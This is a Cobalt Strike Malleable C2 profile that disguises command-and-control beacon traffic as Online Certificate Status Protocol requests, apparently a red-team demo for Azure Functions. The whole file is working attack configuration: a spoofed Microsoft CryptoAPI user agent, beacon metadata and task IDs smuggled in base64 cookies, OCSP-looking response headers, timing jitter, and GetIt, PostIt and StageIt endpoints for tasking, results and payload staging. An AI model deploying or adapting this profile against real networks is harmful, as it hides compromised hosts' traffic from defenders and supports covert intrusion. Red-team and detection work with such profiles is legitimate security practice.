#
# Online Certificate Status Protocol (OCSP) Profile
#   http://tools.ietf.org/html/rfc6960
#
# Author: @harmj0y
# Updated: by FortyNorth Security to demo Azure Functions
#

set sleeptime "20000"; # Use a 20s interval
set jitter    "20"; # 20% jitter
set maxdns    "255";
set useragent "Microsoft-CryptoAPI/6.1";


http-get {

    set uri "/FortyNorth/GetIt";

    client {
        header "Accept" "*/*";

        metadata {
			base64;
			prepend "OSID=";
			header "Cookie";
		}
    }

    server {
        header "Content-Type" "application/ocsp-response";
        header "content-transfer-encoding" "binary";
        header "Cache-Control" "max-age=547738, public, no-transform, must-revalidate";
        header "Connection" "keep-alive";

        output {
            print;
        }
    }
}

http-post {

    set uri "/FortyNorth/PostIt";

    client {

        header "Accept" "*/*";
        
        id {
		base64;
		prepend "TRY=";
		header "Cookie";

        }

        output {
            print;
        }
    }

    server {
        header "Content-Type" "application/ocsp-response";
        header "content-transfer-encoding" "binary";
        header "Cache-Control" "max-age=547738, public, no-transform, must-revalidate";
        header "Connection" "keep-alive";

        output {
            print;
        }
    }
}

http-stager {
	set uri_x86 "/FortyNorth/StageIt";
}
